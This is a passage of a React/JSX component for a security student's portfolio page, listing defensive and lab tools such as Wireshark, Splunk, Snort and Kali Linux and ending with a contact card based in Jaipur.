          <div className="bg-white border border-[#e5e5ea] rounded-2xl p-5 shadow-[0_2px_12px_rgba(0,0,0,0.03)] hover:border-[#d2d2d7] transition-all">
            <div className="w-10 h-10 rounded-xl bg-green-50 border border-green-100 flex items-center justify-center text-[#28cd41] mb-4">
              <span className="material-symbols-outlined text-[22px]">shield</span>
            </div>
            <h3 className="text-lg font-bold text-[#1d1d1f] mb-3">SOC &amp; Defensive</h3>
            <ul className="space-y-2.5 text-[13.5px] text-[#6e6e73]">
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Wireshark</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Packet Telemetry</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">ELK / Splunk</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">SIEM Ingestion</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Snort / Suricata</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">IDS / IPS Rules</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Linux iptables</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Firewall Config</span>
              </li>
            </ul>
          </div>

          {/* Category 4 */}
          <div className="bg-white border border-[#e5e5ea] rounded-2xl p-5 shadow-[0_2px_12px_rgba(0,0,0,0.03)] hover:border-[#d2d2d7] transition-all">
            <div className="w-10 h-10 rounded-xl bg-orange-50 border border-orange-100 flex items-center justify-center text-[#f56300] mb-4">
              <span className="material-symbols-outlined text-[22px]">developer_board</span>
            </div>
            <h3 className="text-lg font-bold text-[#1d1d1f] mb-3">Systems &amp; Labs</h3>
            <ul className="space-y-2.5 text-[13.5px] text-[#6e6e73]">
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Kali Linux</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Primary OS</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Docker</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Sandboxing</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">Git / GitHub</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Version Control</span>
              </li>
              <li className="flex items-center justify-between">
                <span className="text-[#1d1d1f] font-medium">VMware / KVM</span>
                <span className="font-mono text-[11.5px] text-[#86868b]">Hypervisors</span>
              </li>
            </ul>
          </div>
        </div>
      </section>

      {/* Location & Encrypted Contact Action Card */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 sm:py-16 w-full">
        <div className="bg-[#f5f5f7] border border-[#e5e5ea] rounded-2xl p-6 sm:p-10 shadow-[0_4px_24px_rgba(0,0,0,0.03)] relative overflow-hidden">
          <div className="absolute -right-20 -bottom-20 w-80 h-80 bg-blue-100/50 rounded-full blur-3xl pointer-events-none"></div>

          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-8 relative z-10">
            <div className="max-w-xl">
              <div className="inline-flex items-center gap-2 text-[#0071e3] text-[12px] uppercase font-semibold tracking-wider mb-2">
                <span className="w-2 h-2 rounded-full bg-[#28cd41]"></span>
                Operational Location: Jaipur, Rajasthan, India
              </div>
              <h2 className="text-3xl sm:text-4xl font-bold tracking-tight text-[#1d1d1f] mb-3">
                Let's engineer resilient defenses.
              </h2>
              <p className="text-[15px] text-[#6e6e73] leading-relaxed mb-6">
                Ready for SOC Analyst, Offensive Security, or Security Engineering teams. Open to global on-site and remote challenges requiring technical discipline and continuous threat mitigation.
              </p>
              <div className="flex flex-wrap items-center gap-4">
                <button
                  onClick={() => onTabChange('contact')}
                  className="inline-flex items-center justify-center bg-[#0071e3] text-white text-[14px] font-medium rounded-full px-6 py-2.5 hover:bg-[#0077ed] active:scale-[0.98] transition-all shadow-sm"
                >
                  Initiate Encrypted Transmission
                </button>
                <div className="flex items-center gap-3 text-[#6e6e73] text-[13.5px]">
                  <a
                    href={PORTFOLIO_DATA.profile.socials.github}
                    target="_blank"
                    rel="noreferrer"
                    className="hover:text-[#1d1d1f] transition-colors flex items-center gap-1"
                  >
                    <span className="material-symbols-outlined text-[17px]">terminal</span>
                    <span>GitHub Profile</span>
                  </a>
                  <span>•</span>
                  <a
                    href={PORTFOLIO_DATA.profile.socials.linkedin}
                    target="_blank"
                    rel="noreferrer"
                    className="hover:text-[#1d1d1f] transition-colors flex items-center gap-1"
                  >
                    <span className="material-symbols-outlined text-[17px]">share</span>
                    <span>LinkedIn</span>
                  </a>
                </div>
              </div>
            </div>

            {/* Geographic Telemetry Card */}
            <div className="lg:w-80 bg-white border border-[#e5e5ea] rounded-xl p-5 shadow-sm">
              <div className="flex items-center justify-between mb-2">
                <span className="text-[11px] uppercase tracking-wider font-semibold text-[#86868b]">
                  Node Telemetry
                </span>
                <span className="font-mono text-[11px] text-[#0071e3] font-semibold">
                  {PORTFOLIO_DATA.profile.timeZoneLabel}
                </span>
              </div>
              <div className="font-mono text-[13.5px] text-[#1d1d1f] font-semibold mb-1">
                Jaipur, RJ • {PORTFOLIO_DATA.profile.coordinates}
              </div>
              <p className="text-[12px] text-[#6e6e73] mb-4">
                National Capital Region &amp; North India Security Hub
              </p>
              <div className="pt-3 space-y-1.5 font-mono text-[11.5px] text-[#6e6e73] border-t border-[#f0f0f2]">
                <div className="flex justify-between">
                  <span>PGP FINGERPRINT:</span>
                  <span className="text-[#1d1d1f] font-semibold">{PORTFOLIO_DATA.profile.pgpFingerprint}</span>
                </div>
                <div className="flex justify-between">
                  <span>CLEARANCE:</span>
                  <span className="text-[#28cd41] font-semibold">VERIFIED UNDERGRAD</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};
